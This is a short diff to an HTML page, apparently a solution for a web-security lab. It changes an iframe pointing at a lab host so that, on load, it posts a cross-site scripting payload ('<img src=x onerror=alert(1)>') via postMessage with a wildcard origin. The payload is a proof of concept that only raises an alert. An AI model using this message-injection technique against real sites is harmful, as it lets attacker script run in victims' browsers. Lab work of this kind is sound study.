@@ -1,9 +1,11 @@
 <html>
 <body>
-    <iframe id="myiframe" src="https://ptl-f48e6bbc0e7f-d8c9bbf80275.libcurl.me/"></iframe>
+    <iframe id="myiframe" onload="hack()" src="http://ptl-f48e6bbc0e7f-d8c9bbf80275.libcurl.me/"></iframe>
     <script>
+        function hack(){
        var iframesend = document.getElementById("myiframe");
-       iframesend.contentWindow.postMessage("test","*");
+       iframesend.contentWindow.postMessage("data=<img src=x onerror=alert(1)>","*");
+        }
     </script>
 </body>
 </html>
